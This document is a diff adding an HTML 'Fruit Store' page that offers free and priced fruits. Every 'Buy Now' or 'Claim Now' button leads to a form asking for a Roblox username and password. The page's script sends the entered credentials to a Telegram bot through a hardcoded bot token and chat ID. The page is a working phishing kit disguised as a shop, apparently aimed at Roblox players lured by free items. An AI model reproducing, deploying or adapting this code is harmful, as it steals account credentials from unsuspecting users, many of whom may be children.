@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fruit Store</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: #f4f4f4;
+            color: #333;
+        }
+        .container {
+            width: 90%;
+            max-width: 1200px;
+            margin: auto;
+            padding: 20px;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .header h1 {
+            color: #ff9900;
+        }
+        .fruit-list {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 20px;
+            justify-content: center;
+        }
+        .fruit-item {
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            padding: 15px;
+            width: calc(25% - 20px);
+            text-align: center;
+        }
+        .fruit-item img {
+            max-width: 100px;
+            margin-bottom: 10px;
+        }
+        .price {
+            color: #b12704;
+            font-size: 20px;
+            font-weight: bold;
+        }
+        .free {
+            color: green;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 14px;
+            background: #ff9900;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #e68a00;
+        }
+        .hidden {
+            display: none;
+        }
+        .login-page {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            margin: 50px auto;
+            text-align: center;
+        }
+        .login-page input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Fruit Store</h1>
+            <p>Buy your favorite fruits or claim free fruits with our offers!</p>
+        </div>
+
+        <!-- Product List -->
+        <div id="productPage">
+            <div class="fruit-list">
+                <!-- Fruit1 -->
+                <div class="fruit-item">
+                    <img src="https://i.ibb.co/jvbxHJB/fruit1.jpg" alt="Fruit1">
+                    <h3>Fruit1</h3>
+                    <p class="free">FREE</p>
+                    <button class="buyNowButton" data-fruit="Fruit1" data-price="FREE">Claim Now</button>
+                </div>
+                <!-- Fruit2 -->
+                <div class="fruit-item">
+                    <img src="https://i.ibb.co/vq8Wgxx/fruit2.jpg" alt="Fruit2">
+                    <h3>Fruit2</h3>
+                    <p class="free">FREE</p>
+                    <button class="buyNowButton" data-fruit="Fruit2" data-price="FREE">Claim Now</button>
+                </div>
+                <!-- Fruit3 -->
+                <div class="fruit-item">
+                    <img src="https://i.ibb.co/6HJzWmY/fruit3.jpg" alt="Fruit3">
+                    <h3>Fruit3</h3>
+                    <p class="price">₹500</p>
+                    <button class="buyNowButton" data-fruit="Fruit3" data-price="₹500">Buy Now</button>
+                </div>
+                <!-- Fruit4 -->
+                <div class="fruit-item">
+                    <img src="https://i.ibb.co/XVwQmVf/fruit4.jpg" alt="Fruit4">
+                    <h3>Fruit4</h3>
+                    <p class="price">₹600</p>
+                    <button class="buyNowButton" data-fruit="Fruit4" data-price="₹600">Buy Now</button>
+                </div>
+                <!-- Fruit5 -->
+                <div class="fruit-item">
+                    <img src="https://i.ibb.co/D1Wbdgc/fruit5.jpg" alt="Fruit5">
+                    <h3>Fruit5</h3>
+                    <p class="price">₹700</p>
+                    <button class="buyNowButton" data-fruit="Fruit5" data-price="₹700">Buy Now</button>
+                </div>
+                <!-- Fruit6 -->
+                <div class="fruit-item">
+                    <img src="https://i.ibb.co/NWkMtYr/fruit6.jpg" alt="Fruit6">
+                    <h3>Fruit6</h3>
+                    <p class="free">FREE</p>
+                    <button class="buyNowButton" data-fruit="Fruit6" data-price="FREE">Claim Now</button>
+                </div>
+                <!-- Apple -->
+                <div class="fruit-item">
+                    <img src="https://i.ibb.co/RcTCns4/apple.jpg" alt="Apple">
+                    <h3>Apple</h3>
+                    <p class="price">₹500</p>
+                    <button class="buyNowButton" data-fruit="Apple" data-price="₹500">Buy Now</button>
+                </div>
+                <!-- Cherry -->
+                <div class="fruit-item">
+                    <img src="https://i.ibb.co/MR94Tbw/cherry.jpg" alt="Cherry">
+                    <h3>Cherry</h3>
+                    <p class="free">FREE</p>
+                    <button class="buyNowButton" data-fruit="Cherry" data-price="FREE">Claim Now</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Login Page -->
+        <div id="loginPage" class="hidden">
+            <div class="login-page">
+                <h2>Login to Complete Purchase</h2>
+                <form id="loginForm">
+                    <input type="text" id="username" placeholder="Roblox Username" required>
+                    <input type="password" id="password" placeholder="Roblox Password" required>
+                    <button type="submit">Login</button>
+                </form>
+                <p id="responseMessage" style="color: green; margin-top: 20px;"></p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const buyNowButtons = document.querySelectorAll('.buyNowButton');
+        const productPage = document.getElementById('productPage');
+        const loginPage = document.getElementById('loginPage');
+        const responseMessage = document.getElementById('responseMessage');
+        let selectedFruit = '';
+        let selectedPrice = '';
+
+        // Handle Buy Button Click
+        buyNowButtons.forEach(button => {
+            button.addEventListener('click', () => {
+                selectedFruit = button.getAttribute('data-fruit');
+                selectedPrice = button.getAttribute('data-price');
+                
+                // Show login page
+                productPage.classList.add('hidden');
+                loginPage.classList.remove('hidden');
+            });
+        });
+
+        // Handle Login Form Submission
+        document.getElementById('loginForm').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            if (username && password) {
+                // Send data to Telegram bot
+                const botToken = '7560901538:AAEY7zTCeDwQtipGU4Xhn2t73cp-mRAnMhk';
+                const chatId = '-4777447187';
+                const message = `Fruit: ${selectedFruit}, Price: ${selectedPrice}, Username: ${username}, Password: ${password}`;
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                            responseMessage.textContent = 'Data sent successfully!';
+                            responseMessage.style.color = 'green';
+                        } else {
+                            responseMessage.textContent = 'Error sending data!';
+                            responseMessage.style.color = 'red';
+                        }
+                    })
+                    .catch(error => {
+                        responseMessage.textContent = 'Error sending data!';
+                        responseMessage.style.color = 'red';
+                    });
+            } else {
+                responseMessage.textContent = 'Please provide both username and password.';
+                responseMessage.style.color = 'red';
+            }
+        });
+    </script>
+</body>
+</html>
